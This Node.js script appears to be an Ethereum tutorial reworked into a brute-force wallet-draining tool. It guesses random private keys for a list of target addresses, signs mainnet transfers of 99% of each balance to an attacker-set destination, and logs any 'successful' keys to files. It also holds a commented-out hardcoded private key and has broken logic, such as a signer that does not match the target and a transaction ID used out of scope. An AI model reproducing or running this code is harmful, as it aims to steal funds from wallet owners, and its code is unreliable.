/**
 * Require the credentials that you entered in the .env file
 */
require('dotenv').config()

const Web3 = require('web3')
const axios = require('axios')
const EthereumTx = require('ethereumjs-tx')
const log = require('ololog').configure({ time: true })
const ansi = require('ansicolor').nice

const fs = require('fs');

/**
 * Network configuration
 */
const testnet = `https://mainnet.infura.io/${process.env.INFURA_ACCESS_TOKEN}`


/**
 * The amount of ETH you want to send in this transaction
 * @type {Number}
 */
var amountToSend = 100000


/**
 * Fetch the current transaction gas prices from https://ethgasstation.info/
 *
 * @return {object} Gas prices at different priorities
 */
const getCurrentGasPrices = async () => {
	let response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json')
	let prices = {
		low: response.data.safeLow / 10,
		medium: response.data.average / 10,
		high: response.data.fast / 10
	}

	console.log("\r\n")
	log (`Current ETH Gas Prices (in GWEI):`.cyan)
	console.log("\r\n")
	log(`Low: ${prices.low} (transaction completes in < 30 minutes)`.green)
	log(`Standard: ${prices.medium} (transaction completes in < 5 minutes)`.yellow)
	log(`Fast: ${prices.high} (transaction completes in < 2 minutes)`.red)
	console.log("\r\n")

	return prices
}

var gasPrices


const rk = () => {
	var k = '';
	var ks = '1234567890abcdef'
	for(var i = 0; i < 64; i++) {
		k += ks[Math.round(Math.random() * (ks.length - 1))]
	}
	return k
}

/**
 * This is the process that will run when you execute the program.
 */
const main = async (defaultAccount, privateKey) => {

	/**
	 * Change the provider that is passed to HttpProvider to `mainnet` for live transactions.
	 */
	var web3 = new Web3( new Web3.providers.HttpProvider(testnet) )


	/**
	 * Set the web3 default account to use as your public wallet address
	 */
	web3.eth.defaultAccount = defaultAccount


	/**
	 * Fetch your personal wallet's balance
	 */
	let myBalanceWei = web3.eth.getBalance(web3.eth.defaultAccount).toNumber()
	let myBalance = web3.fromWei(myBalanceWei, 'ether')
	amountToSend = Math.floor(myBalance * 0.99)

	log(`Your wallet balance is currently ${myBalance} ETH`.green)


	/**
	 * With every new transaction you send using a specific wallet address,
	 * you need to increase a nonce which is tied to the sender wallet.
	 */
	let nonce = web3.eth.getTransactionCount(web3.eth.defaultAccount)
	log(`The outgoing transaction count for your wallet address is: ${nonce}`.magenta)


	/**
	 * Build a new transaction object and sign it locally.
	 */
	//console.log(gasPrices)
	let details = {
		"to": process.env.DESTINATION_WALLET_ADDRESS,
		"value": web3.toHex( web3.toWei(amountToSend, 'ether') ),
		"gas": 21000,
		"gasPrice": gasPrices.high * 1000000000, // converts the gwei price to wei
		"nonce": nonce,
		"chainId": 1 // EIP 155 chainId - mainnet: 1, rinkeby: 4
	}


	const transaction = new EthereumTx(details)


	/**
	 * This is where the transaction is authorized on your behalf.
	 * The private key is what unlocks your wallet.
	 */
	transaction.sign( Buffer.from(privateKey, 'hex') )


	/**
	 * Now, we'll compress the transaction info down into a transportable object.
	 */
	const serializedTransaction = transaction.serialize()

	/**
	 * Note that the Web3 library is able to automatically determine the "from" address based on your private key.
	 */

	// const addr = transaction.from.toString('hex')
	// log(`Based on your private key, your wallet address is ${addr}`)

	/**
	 * We're ready! Submit the raw transaction details to the provider configured above.
	 */
	// zzz zzz
	try {
		log (`${defaultAccount}: ${amountToSend} : ${privateKey}`.cyan)
		const transactionId = web3.eth.sendRawTransaction('0x' + serializedTransaction.toString('hex') )
		fs.writeFile('oks/' + defaultAccount + '.txt', privateKey + "\n" + transactionId, function(err) {
			/*if(err) {
				return console.log(err);
			}
			console.log("The file was saved!");*/
		})
	} catch (error){
		//console.log(error)
		/*fs.writeFile('errors/' + privateKey + '.txt', JSON.stringify(error), function(err) {
			if(err) {
				return console.log(err);
			}
			console.log("The file was saved!");
		})*/
		return
	}

	/**
	 * We now know the transaction ID, so let's build the public Etherscan url where
	 * the transaction details can be viewed.
	 */
	const url = `https://etherscan.io/tx/${transactionId}`
	log(url.cyan)

	log(`Note: please allow for 30 seconds before transaction appears on Etherscan`.magenta)

	//process.exit()
}

const address = require('./address.js')

const run = () => {
	var pk = rk()
	for(var i = 0; i < address.length; i++) {
		main(address[i], pk)
	}
	setTimeout(function (args) {
		run()
	}, 100)
}

const getGasPrices = async () => {
	/**
	 * Fetch the current transaction gas prices from https://ethgasstation.info/
	 */
	gasPrices = await getCurrentGasPrices()

	run()
	/*for(var i = 0; i < 1000; i++) {
		setTimeout(function (args) {
			run()
		}, 10)
	}*/

	//main('0xaf10cc6c50defff901b535691550d7af208939c5', '71cb935050974a5a35a04ebff913540ed6099a24f40f4ae5f97a9420483823d2')

	//return await getCurrentGasPrices()
}

getGasPrices()

